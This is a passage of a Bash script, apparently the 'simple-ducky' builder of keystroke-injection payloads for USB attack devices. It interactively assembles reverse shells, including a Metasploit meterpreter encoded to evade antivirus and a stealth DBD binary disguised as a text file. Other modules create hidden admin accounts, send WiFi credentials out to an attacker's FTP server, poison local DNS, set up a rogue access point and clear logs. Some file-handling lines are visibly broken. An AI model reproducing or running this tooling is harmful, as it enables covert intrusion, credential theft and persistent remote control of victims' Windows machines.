
####### Reverse Shell Options ###########
f_revshells(){
	clear
	if [[ $osselect = 3 || $osselect = 5 ]]; then
		clear
		echo -e "\e[1;34mShell Options. Note: Only use one...\e[0m"
		echo ""
		echo "1. DBD Reverse Shell (Best | Provides an encrypted persistant shell every 90 minutes)"
		echo "2. Ncat Persistant Reverse Shell (Great | Provides a new shell everytime a user logs in)"
		echo "3. Metasploit Executable (Good | Gets dinged by most AV | Meterpreter or Standard Shell)"
		echo "4. No Download Reverse Shell (Great | Long build time)"
		echo ""
		read -p "Option: " shelltype

		if [ "$shelltype" == "1" ]; then
			clear
			echo -e "\e[1;34mLet's configure some settings for the DBD reverse shell...\e[0m"
			echo ""
			echo ""
			read -p "Where shall I send your persistent shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo ""
			read -p "What would you like the shared secret to be on your secure connection? " attackersecret
			echo ""
			clear
			echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
			sleep 3 
			sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
			sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
			sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
			rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
			rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
			cd /usr/share/simple-ducky/misc/dbd/
			make mingw-cross CFLAGS=-DSTEALTH
			cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
			cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
			rm dbd.exe
			cd /usr/share/simple-ducky
			echo -e ""
			echo -e "\e[1;34mDone!\e[0m"
			sleep 3
			clear
			echo -e "\e[1;34mNow let's configure the setting to add to your inject.bin\e[0m"
			echo ""
			echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
			read -p "[Example: www.example.com | www.example.com:port | 192.168.1.100 ] " webserverip
			echo ""
			clear
			echo -e "\e[1;34mAdding the DBD Revervse Shell to your payload...\e[0m"
			echo ""
			sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/powershellsys.conf > /usr/share/simple-ducky/payloads/builder/main-attack/powershellsys_del1.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/powershellsys_del1.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/powershellsys_del1.conf
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			echo "dbd -lvp $attackerport -k $attackersecret"
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		elif [ "$shelltype" == "2" ]; then
			clear
			echo -e "\e[1;34mLet's configure some settings for Ncat persistant reverse shell...\e[0m"
			echo ""
			echo ""
			read -p "What would you like the username to be for your admin account? " attackeruser
			echo ""
			read -p "What would you like the password to be for your admin account? " attackerpass
			echo ""
			read -p "Where shall I send your persistent shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo ""
			echo -e "What is the IP/Domain address for your webserver? " 
			read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
			echo ""
			clear
			echo -e "\e[1;34mAdding a persistant revervse shell to your payload...\e[0m"
			echo ""
			sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del1.conf
			sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del2.conf
			sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del2.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf
			sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf
			sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del1.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del2.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf			
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del5.conf
			cp /usr/share/simple-ducky/misc/ncat.exe /var/www/
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			echo "ncat -lvp $attackerport"
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		elif [ "$shelltype" == "3" ]; then
			clear
			echo -e "\e[1;34mLets start by building your evil executable\e[0m"
			echo ""
			echo ""
			read -p "Where shall I send your shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo -e ""
			read -p "Would you like a meterpreter or standard shell[ met | std ]? " payloadtype
			clear
			echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
			if [ "$payloadtype" == "met" ]; then
				msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
			else 
				msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
			fi		
			echo -e ""
			echo -e "\e[1;34mDone!\e[0m"
			sleep 3
			clear
			echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
			echo ""
			echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
			read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
			echo ""
			clear
			echo -e "\e[1;34mAdding a Metasploit shell to your payload...\e[0m"
			echo ""
			sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec.conf > /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec_del1.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec_del1.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec_del1.conf
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			if [ "$payloadtype" == "met" ]; then
				echo "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E"
			else
				echo " ncat -lvp $attackerport"
			fi
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		elif [ "$shelltype" == "4" ]; then
			clear
			echo -e "\e[1;34mLet's configure some settings for the no download reverse shell.\e[0m"
			echo ""
			echo ""
			read -p "Where shall I send your shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo ""
			clear
			echo -e "\e[1;34mAdding adding the no download shell to your payload...\e[0m"
			echo ""
			sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell.conf > /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf
			sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			echo "ncat -lvp $attackerport"
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		fi
		
	elif [ "$osselect" == "1" ]; then
		clear
		echo -e "\e[1;34mLet's configure some settings for the no download reverse shell.\e[0m"
		echo ""
		echo ""
		read -p "Where shall I send your shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		clear
		echo -e "\e[1;34mAdding adding the no download shell to your payload...\e[0m"
		echo ""
		sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell.conf > /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf
		sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf
		cat /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf >> /usr/share/simple-ducky/payload.txt
		echo  >> /usr/share/simple-ducky/payload.txt
		rm /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf
		rm /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf
		echo ""
		echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
		echo "ncat -lvp $attackerport"
		echo ""
		read -p "Press Enter to continue..." contuinue
		f_attackadd
		
	elif [[ $osselect == 2 || $osselect = 4 ]]; then
		clear
		echo -e "\e[1;34mShell Options. Note: Only use one...\e[0m"
		echo ""
		echo "1. DBD Reverse Shell (Best | Provides an encrypted persistant shell every 90 minutes)"
		echo "2. Metasploit Executable (Good | Gets dinged by most AV | Meterpreter or Standard Shell)"
		echo "3. No Download Reverse Shell (Great | Long build time)"
		echo ""
		read -p "Option: " shelltype

		if [ "$shelltype" == "1" ]; then
			clear
			echo -e "\e[1;34mLet's configure some settings for the DBD reverse shell...\e[0m"
			echo ""
			echo ""
			read -p "Where shall I send your persistent shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo ""
			read -p "What would you like the shared secret to be on your secure connection? " attackersecret
			echo ""
			clear
			echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
			sleep 3 
			sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
			sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
			sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
			rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
			rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
			cd /usr/share/simple-ducky/misc/dbd/
			make mingw-cross CFLAGS=-DSTEALTH
			cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
			cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
			rm dbd.exe
			cd /usr/share/simple-ducky
			echo -e ""
			echo -e "\e[1;34mDone!\e[0m"
			sleep 3
			clear
			echo -e "\e[1;34mNow let's configure the setting to add to your inject.bin\e[0m"
			echo ""
			echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
			read -p "[Example: www.example.com | www.example.com:port | 192.168.1.100 ] " webserverip
			echo ""
			clear
			echo -e "\e[1;34mAdding the DBD Revervse Shell to your payload...\e[0m"
			echo ""
			sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec.conf > /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec_del1.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec_del1.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/powershellexec_del1.conf
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			echo "dbd -lvp $attackerport -k $attackersecret"
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		elif [ "$shelltype" == "2" ]; then
			clear
			echo -e "\e[1;34mLet's configure some settings for Ncat persistant reverse shell...\e[0m"
			echo ""
			echo ""
			read -p "What would you like the username to be for your admin account? " attackeruser
			echo ""
			read -p "What would you like the password to be for your admin account? " attackerpass
			echo ""
			read -p "Where shall I send your persistent shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo ""
			echo -e "What is the IP/Domain address for your webserver? " 
			read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
			echo ""
			clear
			echo -e "\e[1;34mAdding a persistant revervse shell to your payload...\e[0m"
			echo ""
			sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del1.conf
			sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del2.conf
			sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del2.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf
			sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf
			sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf > /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del1.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del2.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del3.conf			
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del4.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/ncshell_del5.conf
			cp /usr/share/simple-ducky/misc/ncat.exe /var/www/
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			echo "ncat -lvp $attackerport"
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		elif [ "$shelltype" == "3" ]; then
			clear
			echo -e "\e[1;34mLet's configure some settings for the no download reverse shell.\e[0m"
			echo ""
			echo ""
			read -p "Where shall I send your shell? " attackerip
			echo ""
			read -p "What port will you be listening on? " attackerport
			echo ""
			clear
			echo -e "\e[1;34mAdding adding the no download shell to your payload...\e[0m"
			echo ""
			sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell.conf > /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf
			sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf
			cat /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf >> /usr/share/simple-ducky/payload.txt
			echo  >> /usr/share/simple-ducky/payload.txt
			rm /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del1.conf
			rm /usr/share/simple-ducky/payloads/builder/main-attack/nodownloadshell_del2.conf
			echo ""
			echo -e "\e[1;32mDone! When you are ready to receive your shell use this command...\e[0m"
			echo "ncat -lvp $attackerport"
			echo ""
			read -p "Press Enter to continue..." contuinue
			f_attackadd
		fi
	fi
}

####### Proxy in the Middle Option ###########
f_pitmattack(){
	if [[ $osselect == 1 || $osselect = 2 || $osselect = 3 ]]; then 
		clear
		echo -e "\e[1;34mLet's configure some settings for the Proxy in the Middle attack. Note, this will be the first option to run...\e[0m"
		echo ""
		echo ""
		read -p "What IP/domain would you like to use for your proxy server? " attackerip
		echo ""
		read -p "What port will you be using for your proxy server (example: 8081)? " attackerport
		echo ""
		clear
		echo -e "\e[1;34mAdding the Proxy in the Middle attack to your payload...\e[0m"
		echo ""
		sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7.conf > /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del1.conf
		sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del2.conf
		#echo  >> /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del2.conf
		cat /usr/share/simple-ducky/payload.txt >> /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del2.conf
		cp /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del2.conf /usr/share/simple-ducky/payload.txt
		rm /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del1.conf
		rm /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del2.conf
		echo ""
		echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
		echo ""
		sleep 2
		echo ""
		echo '1) Select the "Proxy" tab'
		echo ""
		echo '2) Under "Intercept" ensure that "Intercept is off"'
		echo ""
		echo '3) Select the "Options" tab under "Proxy"'
		echo ""
		echo '4) Under "Proxy Listeners" select "Add" to add a new listener'
		echo ""
		echo "5) In the "Bind to port:" radio box put $attackerport"
		echo ""
		echo "6) Click the "Specific address:" radio button and select $attackerip / the attacking machines IP address"
		echo ""
		echo '7) Select the "History" tab to view the traffic from the victims machine'
		echo ""
		read -p "Press any key to contiue" enter
		echo ""
		echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
		echo ""
		sleep 3
	elif [[ $osselect == 4 || $osselect = 5 ]]; then
		clear
		echo -e "\e[1;34mLet's configure some settings for the Proxy in the Middle attack. Note, this will be the first option to run...\e[0m"
		echo ""
		echo ""
		read -p "What IP/domain would you like to use for your proxy server? " attackerip
		echo ""
		read -p "What port will you be using for your proxy server (example: 8081)? " attackerport
		echo ""
		clear
		echo -e "\e[1;34mAdding the Proxy in the Middle attack to your payload...\e[0m"
		echo ""
		sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/pitmwin8.conf > /usr/share/simple-ducky/payloads/builder/main-attack/pitmwin8_del1.conf
		sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/builder/main-attack/pitmwin8_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/pitmwin8_del2.conf
		#echo  >> /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis7_del2.conf
		cat /usr/share/simple-ducky/payload.txt >> /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis8_del2.conf
		cp /usr/share/simple-ducky/payloads/builder/main-attack/pitmvis8_del2.conf /usr/share/simple-ducky/payload.txt
		rm /usr/share/simple-ducky/payloads/builder/main-attack/pitmwin8_del1.conf
		rm /usr/share/simple-ducky/payloads/builder/main-attack/pitmwin8_del2.conf
		echo ""
		echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
		echo ""
		sleep 2
		echo ""
		echo '1) Select the "Proxy" tab'
		echo ""
		echo '2) Under "Intercept" ensure that "Intercept is off"'
		echo ""
		echo '3) Select the "Options" tab under "Proxy"'
		echo ""
		echo '4) Under "Proxy Listeners" select "Add" to add a new listener'
		echo ""
		echo "5) In the "Bind to port:" radio box put $attackerport"
		echo ""
		echo "6) Click the "Specific address:" radio button and select $attackerip / the attacking machines IP address"
		echo ""
		echo '7) Select the "History" tab to view the traffic from the victims machine'
		echo ""
		read -p "Press any key to contiue" enter
		echo ""
		echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
		echo ""
		sleep 3
	fi
		f_attackadd
}

####### WiFi Credential Harvest Option ###########
f_wificreds(){
	clear
	echo -e "\e[1;34mLet's configure some settings for the credential extraction...\e[0m"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	clear
	echo -e "\e[1;34mAdding the wifi credential extractor to your payload...\e[0m"
	echo ""
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/builder/main-attack/wificred.conf > /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del1.conf
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del2.conf
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del2.conf > /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del3.conf
	cat /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del3.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del1.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del2.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/wificred_del3.conf
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_attackadd
}

####### Rogue Access Point Option ###########
f_rogueaccess(){
	clear
	echo -e "\e[1;34mLet's configure some settings for the rogue access point...\e[0m"
	echo ""
	echo ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	clear
	echo -e "\e[1;34mAdding the rogue access point option to your payload...\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor.conf > /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor_del1.conf
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor_del2.conf
	cat /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor_del2.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor_del1.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/wifibackdoor_del2.conf
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_attackadd
}

####### Auto Connect to Access Point Option ###########
f_autoassociate(){
	clear
	echo -e "\e[1;34mAdding the wifi auto connect option to your payload...\e[0m"
	echo ""
	sleep 3
	cat /usr/share/simple-ducky/payloads/builder/main-attack/wifiautoconnect.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	echo ""
	echo -e "\e[1;32mDone! Returning to the Main-Attack menu...\e[0m"
	echo ""
	echo -e "\e[1;33mThe victim will auto connect to: Pineapple\e[0m"
	echo ""
	read -p "Press Enter to continue..." continue
	f_attackadd
}

####### Local DNS Poisoning Option ###########
f_dnspoison(){
	clear
	echo -e "\e[1;34mLet's configure some settings for the DNS poisoning attack. Note: you run this as many times as you would like..\e[0m"
	echo ""
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo ""
	clear
	echo -e "\e[1;34mAdding DNS poisoning to your payload...\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/localdns.conf > /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del1.conf
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del1.conf > /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del2.conf
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del2.conf > /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del3.conf
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del3.conf > /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del4.conf
	cat /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del4.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del1.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del2.conf
	rm /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del3.conf			
	rm /usr/share/simple-ducky/payloads/builder/main-attack/localdns_del4.conf
	echo ""
	echo -e "\e[1;32mDone! Returning to the Pre-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_attackadd
}
############ Post Attack Option Add ###########################

####### Clear all logs Option ###########
f_clearlogs(){
	clear
	echo -e "\e[1;34mAdding the clear all logs option to your payload...\e[0m"
	echo ""
	sleep 3
	cat /usr/share/simple-ducky/payloads/builder/post-attack/clearlogs.conf >> /usr/share/simple-ducky/payload.txt
	echo  >> /usr/share/simple-ducky/payload.txt
	echo ""
	echo -e "\e[1;32mDone! Returning to the Post-Attack menu...\e[0m"
	echo ""
	sleep 3
	f_postattackadd
}

####### Inject.bin ###########
f_injectcreate(){
	clear
	echo -e "\e[1;34mHow would you like to exit?\e[0m"
	echo ""
	echo '1. Exit the command prompt and the leave the machine "as is"'
	echo "2. Exit the command prompt and lock the screen"
	echo ""
	read -p "Option: " exitoption

	if [ "$exitoption" == "1" ]; then
		clear
		echo -e "\e[1;34mHow long of a delay would like before starting?\e[0m "
		read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
		echo ""
		clear
		echo -e "\e[1;34mFinalizing your payload...\e[0m"
		echo ""
		sleep 3
		cat /usr/share/simple-ducky/payloads/builder/post-attack/finish.conf >> /usr/share/simple-ducky/payload.txt
		sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
		sed '/^$/d' /usr/share/simple-ducky/payload.txt >> /usr/share/simple-ducky/payload1.txt
		cat /usr/share/simple-ducky/payload1.txt > /usr/share/simple-ducky/payload.txt
		rm /usr/share/simple-ducky/payload1.txt
		echo ""
		echo -e "\e[1;32mDone! Let's generate your inject.bin...\e[0m"
		echo ""
		sleep 3
	elif [ "$exitoption" == "2" ]; then
		clear
		echo -e "\e[1;34mHow long of a delay would like before starting?\e[0m "
		read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
		echo ""
		clear
		echo -e "\e[1;34mFinalizing your payload...\e[0m"
		echo ""
		sleep 3
		cat /usr/share/simple-ducky/payloads/builder/post-attack/finishlock.conf >> /usr/share/simple-ducky/payload.txt
		sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
		sed '/^$/d' /usr/share/simple-ducky/payload.txt >> /usr/share/simple-ducky/payload1.txt
		cat /usr/share/simple-ducky/payload1.txt > /usr/share/simple-ducky/payload.txt
		rm /usr/share/simple-ducky/payload1.txt
		echo ""
		echo -e "\e[1;32mDone! Let's generate your inject.bin...\e[0m"
		echo ""
		sleep 3
	fi
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mI'm going to make sure that your FTP and Webserver are running.\e[0m"
	echo ""
	sleep 3
	service pure-ftpd start
	service apache2 start
	echo ""
	echo -e "\e[1;32mYour FTP and Webserver are running.\e[0m"
	echo ""
	read -p "Press Enter to return to the main menu"
